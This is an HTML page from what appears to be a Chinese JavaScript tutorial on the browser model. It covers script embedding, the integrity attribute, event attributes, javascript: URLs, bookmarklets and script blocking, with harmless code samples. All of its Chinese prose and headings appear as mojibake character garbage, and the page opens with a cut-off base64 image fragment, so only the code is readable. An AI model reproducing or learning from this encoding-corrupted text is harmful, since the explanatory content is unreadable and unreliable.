QIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">
          æµè§ˆå™¨æ¨¡å‹
        </h1> <div class="theme-vdoing-content content__default"><h2 id="ä¸€ã€æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°"><a href="#ä¸€ã€æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°" class="header-anchor">#</a> ä¸€ã€æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°</h2> <p>JavaScript æ˜¯æµè§ˆå™¨çš„å†…ç½®è„šæœ¬è¯­è¨€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæµè§ˆå™¨å†…ç½®äº† JavaScript å¼•æ“ï¼Œå¹¶ä¸”æä¾›å„ç§æ¥å£ï¼Œè®© JavaScript è„šæœ¬å¯ä»¥æ§åˆ¶æµè§ˆå™¨çš„å„ç§åŠŸèƒ½ã€‚ä¸€æ—¦ç½‘é¡µå†…åµŒäº† JavaScript è„šæœ¬ï¼Œæµè§ˆå™¨åŠ è½½ç½‘é¡µï¼Œå°±ä¼šå»æ‰§è¡Œè„šæœ¬ï¼Œä»è€Œè¾¾åˆ°æ“ä½œæµè§ˆå™¨çš„ç›®çš„ï¼Œå®ç°ç½‘é¡µçš„å„ç§åŠ¨æ€æ•ˆæœã€‚</p> <p>æœ¬ç« å¼€å§‹ä»‹ç»æµè§ˆå™¨æä¾›çš„å„ç§ JavaScript æ¥å£ã€‚é¦–å…ˆï¼Œä»‹ç» JavaScript ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•ã€‚</p> <h2 id="_1-ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•"><a href="#_1-ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•" class="header-anchor">#</a> 1.ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•</h2> <p>ç½‘é¡µä¸­åµŒå…¥ JavaScript ä»£ç ï¼Œä¸»è¦æœ‰ä¸‰ç§æ–¹æ³•ã€‚</p> <ul><li><code>&lt;script&gt;</code>å…ƒç´ ç›´æ¥åµŒå…¥ä»£ç ã€‚</li> <li><code>&lt;script&gt;</code>æ ‡ç­¾åŠ è½½å¤–éƒ¨è„šæœ¬</li> <li>äº‹ä»¶å±æ€§</li> <li>URL åè®®</li></ul> <h3 id="script-å…ƒç´ åµŒå…¥ä»£ç "><a href="#script-å…ƒç´ åµŒå…¥ä»£ç " class="header-anchor">#</a> script å…ƒç´ åµŒå…¥ä»£ç </h3> <p><code>&lt;script&gt;</code>å…ƒç´ å†…éƒ¨å¯ä»¥ç›´æ¥å†™ JavaScript ä»£ç ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><code>&lt;script&gt;</code>æ ‡ç­¾æœ‰ä¸€ä¸ª**<code>type</code>å±æ€§ï¼Œç”¨æ¥æŒ‡å®šè„šæœ¬ç±»å‹**ã€‚å¯¹ JavaScript è„šæœ¬æ¥è¯´ï¼Œ<code>type</code>å±æ€§å¯ä»¥è®¾ä¸ºä¸¤ç§å€¼ã€‚</p> <ul><li><code>text/javascript</code>ï¼šè¿™æ˜¯é»˜è®¤å€¼ï¼Œä¹Ÿæ˜¯å†å²ä¸Šä¸€è´¯è®¾å®šçš„å€¼ã€‚å¦‚æœä½ çœç•¥<code>type</code>å±æ€§ï¼Œé»˜è®¤å°±æ˜¯è¿™ä¸ªå€¼ã€‚å¯¹äºè€å¼æµè§ˆå™¨ï¼Œè®¾ä¸ºè¿™ä¸ªå€¼æ¯”è¾ƒå¥½ã€‚</li> <li><code>application/javascript</code>ï¼šå¯¹äºè¾ƒæ–°çš„æµè§ˆå™¨ï¼Œå»ºè®®è®¾ä¸ºè¿™ä¸ªå€¼ã€‚</li></ul> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>application/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello World'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ç”±äº<code>&lt;script&gt;</code>æ ‡ç­¾é»˜è®¤å°±æ˜¯ JavaScript ä»£ç ã€‚æ‰€ä»¥ï¼ŒåµŒå…¥ JavaScript è„šæœ¬æ—¶ï¼Œ<code>type</code>å±æ€§å¯ä»¥çœç•¥ã€‚</p> <p>å¦‚æœ<code>type</code>å±æ€§çš„å€¼ï¼Œæµè§ˆå™¨ä¸è®¤è¯†ï¼Œé‚£ä¹ˆå®ƒä¸ä¼šæ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥åœ¨<code>&lt;script&gt;</code>æ ‡ç­¾ä¹‹ä¸­åµŒå…¥ä»»æ„çš„æ–‡æœ¬å†…å®¹ï¼Œåªè¦åŠ ä¸Šä¸€ä¸ªæµè§ˆå™¨ä¸è®¤è¯†çš„<code>type</code>å±æ€§å³å¯ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>mydata<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>x-custom-data<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello World'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢çš„ä»£ç ï¼Œæµè§ˆå™¨ä¸ä¼šæ‰§è¡Œï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºå®ƒçš„å†…å®¹ï¼Œå› ä¸ºä¸è®¤è¯†å®ƒçš„<code>type</code>å±æ€§ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ª<code>&lt;script&gt;</code>èŠ‚ç‚¹ä¾ç„¶å­˜åœ¨äº DOM ä¹‹ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>&lt;script&gt;</code>èŠ‚ç‚¹çš„<code>text</code>å±æ€§è¯»å‡ºå®ƒçš„å†…å®¹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'mydata'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
<span class="token comment">//   console.log('Hello World');</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="script-å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬"><a href="#script-å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬" class="header-anchor">#</a> script å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬</h3> <p><code>&lt;script&gt;</code>æ ‡ç­¾ä¹Ÿå¯ä»¥æŒ‡å®šåŠ è½½å¤–éƒ¨çš„è„šæœ¬æ–‡ä»¶ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>https://www.example.com/script.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å¦‚æœè„šæœ¬æ–‡ä»¶ä½¿ç”¨äº†éè‹±è¯­å­—ç¬¦ï¼Œè¿˜åº”è¯¥æ³¨æ˜å­—ç¬¦çš„ç¼–ç ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>https://www.example.com/script.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ‰€åŠ è½½çš„è„šæœ¬å¿…é¡»æ˜¯çº¯çš„ JavaScript ä»£ç ï¼Œä¸èƒ½æœ‰<code>HTML</code>ä»£ç å’Œ<code>&lt;script&gt;</code>æ ‡ç­¾ã€‚</p> <p>åŠ è½½å¤–éƒ¨è„šæœ¬å’Œç›´æ¥æ·»åŠ ä»£ç å—ï¼Œè¿™ä¸¤ç§æ–¹æ³•ä¸èƒ½æ··ç”¨ã€‚ä¸‹é¢ä»£ç çš„<code>console.log</code>è¯­å¥ç›´æ¥è¢«å¿½ç•¥ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>example.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello World!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸ºäº†é˜²æ­¢æ”»å‡»è€…ç¯¡æ”¹å¤–éƒ¨è„šæœ¬ï¼Œ<code>script</code>æ ‡ç­¾å…è®¸è®¾ç½®ä¸€ä¸ª<code>integrity</code>å±æ€§ï¼Œå†™å…¥è¯¥å¤–éƒ¨è„šæœ¬çš„ Hash ç­¾åï¼Œç”¨æ¥éªŒè¯è„šæœ¬çš„ä¸€è‡´æ€§ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>/assets/application.js<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>script</code>æ ‡ç­¾æœ‰ä¸€ä¸ª<code>integrity</code>å±æ€§ï¼ŒæŒ‡å®šäº†å¤–éƒ¨è„šæœ¬<code>/assets/application.js</code>çš„ SHA256 ç­¾åã€‚ä¸€æ—¦æœ‰äººæ”¹äº†è¿™ä¸ªè„šæœ¬ï¼Œå¯¼è‡´ SHA256 ç­¾åä¸åŒ¹é…ï¼Œæµè§ˆå™¨å°±ä¼šæ‹’ç»åŠ è½½ã€‚</p> <h3 id="äº‹ä»¶å±æ€§"><a href="#äº‹ä»¶å±æ€§" class="header-anchor">#</a> äº‹ä»¶å±æ€§</h3> <p>ç½‘é¡µå…ƒç´ çš„äº‹ä»¶å±æ€§ï¼ˆæ¯”å¦‚<code>onclick</code>å’Œ<code>onmouseover</code>ï¼‰ï¼Œå¯ä»¥å†™å…¥ JavaScript ä»£ç ã€‚å½“æŒ‡å®šäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå°±ä¼šè°ƒç”¨è¿™äº›ä»£ç ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>myBtn<span class="token punctuation">&quot;</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>console.log(this.id)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢çš„äº‹ä»¶å±æ€§ä»£ç åªæœ‰ä¸€ä¸ªè¯­å¥ã€‚å¦‚æœæœ‰å¤šä¸ªè¯­å¥ï¼Œä½¿ç”¨åˆ†å·åˆ†éš”å³å¯ã€‚</p> <h3 id="url-åè®®"><a href="#url-åè®®" class="header-anchor">#</a> URL åè®®</h3> <p>URL æ”¯æŒ<code>javascript:</code>åè®®ï¼Œå³åœ¨ URL çš„ä½ç½®å†™å…¥ä»£ç ï¼Œä½¿ç”¨è¿™ä¸ª URL çš„æ—¶å€™å°±ä¼šæ‰§è¡Œ JavaScript ä»£ç ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>javascript:console.log('Hello')<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æµè§ˆå™¨çš„åœ°å€æ ä¹Ÿå¯ä»¥æ‰§è¡Œ<code>javascript:</code>åè®®ã€‚å°†<code>javascript:console.log('Hello')</code>æ”¾å…¥åœ°å€æ ï¼ŒæŒ‰å›è½¦é”®ä¹Ÿä¼šæ‰§è¡Œè¿™æ®µä»£ç ã€‚</p> <p>å¦‚æœ JavaScript ä»£ç è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæµè§ˆå™¨å°±ä¼šæ–°å»ºä¸€ä¸ªæ–‡æ¡£ï¼Œå±•ç¤ºè¿™ä¸ªå­—ç¬¦ä¸²çš„å†…å®¹ï¼ŒåŸæœ‰æ–‡æ¡£çš„å†…å®¹éƒ½ä¼šæ¶ˆå¤±ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>javascript: new Date().toLocaleTimeString();<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥ä»¥åï¼Œä¼šæ‰“å¼€ä¸€ä¸ªæ–°æ–‡æ¡£ï¼Œé‡Œé¢æœ‰å½“å‰æ—¶é—´ã€‚</p> <p>å¦‚æœè¿”å›çš„ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¸ä¼šæ–°å»ºæ–‡æ¡£ï¼Œä¹Ÿä¸ä¼šè·³è½¬ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;javascript: console.log(new Date().toLocaleTimeString())&quot;</span><span class="token operator">&gt;</span>ç‚¹å‡»<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç”¨æˆ·ç‚¹å‡»é“¾æ¥åï¼Œç½‘é¡µä¸ä¼šè·³è½¬ï¼Œåªä¼šåœ¨æ§åˆ¶å°æ˜¾ç¤ºå½“å‰æ—¶é—´ã€‚</p> <p><code>javascript:</code>åè®®çš„å¸¸è§ç”¨é€”æ˜¯ä¹¦ç­¾è„šæœ¬ Bookmarkletã€‚ç”±äºæµè§ˆå™¨çš„ä¹¦ç­¾ä¿å­˜çš„æ˜¯ä¸€ä¸ªç½‘å€ï¼Œæ‰€ä»¥<code>javascript:</code>ç½‘å€ä¹Ÿå¯ä»¥ä¿å­˜åœ¨é‡Œé¢ï¼Œç”¨æˆ·é€‰æ‹©è¿™ä¸ªä¹¦ç­¾çš„æ—¶å€™ï¼Œå°±ä¼šåœ¨å½“å‰é¡µé¢æ‰§è¡Œè¿™ä¸ªè„šæœ¬ã€‚ä¸ºäº†é˜²æ­¢ä¹¦ç­¾æ›¿æ¢æ‰å½“å‰æ–‡æ¡£ï¼Œå¯ä»¥åœ¨è„šæœ¬å‰åŠ ä¸Š<code>void</code>ï¼Œæˆ–è€…åœ¨è„šæœ¬æœ€ååŠ ä¸Š<code>void 0</code>ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>javascript: void new Date().toLocaleTimeString();<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>javascript: new Date().toLocaleTimeString();void 0;<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢è¿™ä¸¤ç§å†™æ³•ï¼Œç‚¹å‡»é“¾æ¥åï¼Œæ‰§è¡Œä»£ç éƒ½ä¸ä¼šç½‘é¡µè·³è½¬ã€‚</p> <h2 id="_2-script-å…ƒç´ "><a href="#_2-script-å…ƒç´ " class="header-anchor">#</a> 2.script å…ƒç´ </h2> <h3 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="header-anchor">#</a> å·¥ä½œåŸç†</h3> <p>æµè§ˆå™¨åŠ è½½ JavaScript è„šæœ¬ï¼Œä¸»è¦é€šè¿‡<code>&lt;script&gt;</code>å…ƒç´ å®Œæˆã€‚æ­£å¸¸çš„ç½‘é¡µåŠ è½½æµç¨‹æ˜¯è¿™æ ·çš„ã€‚</p> <ol><li>æµè§ˆå™¨ä¸€è¾¹ä¸‹è½½ HTML ç½‘é¡µï¼Œä¸€è¾¹å¼€å§‹è§£æã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>ä¸ç­‰åˆ°ä¸‹è½½å®Œï¼Œå°±å¼€å§‹è§£æ</strong>ã€‚</li> <li>è§£æè¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨<strong>å‘ç°<code>&lt;script&gt;</code>å…ƒç´ ï¼Œå°±æš‚åœè§£æ</strong>ï¼ŒæŠŠç½‘é¡µæ¸²æŸ“çš„æ§åˆ¶æƒè½¬<strong>äº¤ç»™ JavaScript å¼•æ“</strong>ã€‚</li> <li>å¦‚æœ<code>&lt;script&gt;</code>å…ƒç´ å¼•ç”¨äº†å¤–éƒ¨è„šæœ¬ï¼Œå°±ä¸‹è½½è¯¥è„šæœ¬å†æ‰§è¡Œï¼Œå¦åˆ™å°±ç›´æ¥æ‰§è¡Œä»£ç ã€‚</li> <li>JavaScript å¼•æ“æ‰§è¡Œå®Œæ¯•ï¼Œ<strong>æ§åˆ¶æƒäº¤è¿˜æ¸²æŸ“å¼•æ“</strong>ï¼Œæ¢å¤å¾€ä¸‹è§£æ HTML ç½‘é¡µã€‚</li></ol> <p>åŠ è½½å¤–éƒ¨è„šæœ¬æ—¶ï¼Œæµè§ˆå™¨ä¼šæš‚åœé¡µé¢æ¸²æŸ“ï¼Œç­‰å¾…è„šæœ¬ä¸‹è½½å¹¶æ‰§è¡Œå®Œæˆåï¼Œå†ç»§ç»­æ¸²æŸ“ã€‚åŸå› æ˜¯ JavaScript ä»£ç å¯ä»¥ä¿®æ”¹ DOMï¼Œæ‰€ä»¥å¿…é¡»æŠŠæ§åˆ¶æƒè®©ç»™å®ƒï¼Œå¦åˆ™ä¼šå¯¼è‡´å¤æ‚çš„çº¿ç¨‹ç«èµ›çš„é—®é¢˜ã€‚</p> <p>å¦‚æœå¤–éƒ¨è„šæœ¬åŠ è½½æ—¶é—´å¾ˆé•¿ï¼ˆä¸€ç›´æ— æ³•å®Œæˆä¸‹è½½ï¼‰ï¼Œé‚£ä¹ˆæµè§ˆå™¨å°±ä¼šä¸€ç›´ç­‰å¾…è„šæœ¬ä¸‹è½½å®Œæˆï¼Œé€ æˆç½‘é¡µé•¿æ—¶é—´å¤±å»å“åº”ï¼Œæµè§ˆå™¨å°±ä¼šå‘ˆç°â€œå‡æ­»â€çŠ¶æ€ï¼Œè¿™è¢«ç§°ä¸ºâ€œé˜»å¡æ•ˆåº”â€ã€‚</p> <p>ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œè¾ƒå¥½çš„åšæ³•æ˜¯å°†<code>&lt;script&gt;</code>æ ‡ç­¾éƒ½æ”¾åœ¨é¡µé¢åº•éƒ¨ï¼Œè€Œä¸æ˜¯å¤´éƒ¨ã€‚è¿™æ ·å³ä½¿é‡åˆ°è„šæœ¬å¤±å»å“åº”ï¼Œç½‘é¡µä¸»ä½“çš„æ¸²æŸ“ä¹Ÿå·²ç»å®Œæˆäº†ï¼Œç”¨æˆ·è‡³å°‘å¯ä»¥çœ‹åˆ°å†…å®¹ï¼Œè€Œä¸æ˜¯é¢å¯¹ä¸€å¼ ç©ºç™½çš„é¡µé¢ã€‚å¦‚æœæŸäº›è„šæœ¬ä»£ç éå¸¸é‡è¦ï¼Œä¸€å®šè¦æ”¾åœ¨é¡µé¢å¤´éƒ¨çš„è¯ï¼Œæœ€å¥½ç›´æ¥å°†ä»£ç å†™å…¥é¡µé¢ï¼Œè€Œä¸æ˜¯è¿æ¥å¤–éƒ¨è„šæœ¬æ–‡ä»¶ï¼Œè¿™æ ·èƒ½ç¼©çŸ­åŠ è½½æ—¶é—´ã€‚</p> <p>è„šæœ¬æ–‡ä»¶éƒ½æ”¾åœ¨ç½‘é¡µå°¾éƒ¨åŠ è½½ï¼Œè¿˜æœ‰ä¸€ä¸ªå¥½å¤„ã€‚å› ä¸ºåœ¨ DOM ç»“æ„ç”Ÿæˆä¹‹å‰å°±è°ƒç”¨ DOM èŠ‚ç‚¹ï¼ŒJavaScript ä¼šæŠ¥é”™ï¼Œå¦‚æœè„šæœ¬éƒ½åœ¨ç½‘é¡µå°¾éƒ¨åŠ è½½ï¼Œå°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºè¿™æ—¶ DOM è‚¯å®šå·²ç»ç”Ÿæˆäº†ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>ä¸Šé¢ä»£ç æ‰§è¡Œæ—¶ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ­¤æ—¶<code>document.body</code>å…ƒç´ è¿˜æœªç”Ÿæˆã€‚</p> <p>ä¸€ç§è§£å†³æ–¹æ³•æ˜¯è®¾å®š<code>DOMContentLoaded</code>äº‹ä»¶çš„å›è°ƒå‡½æ•°ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>
      <span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span>
      <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>

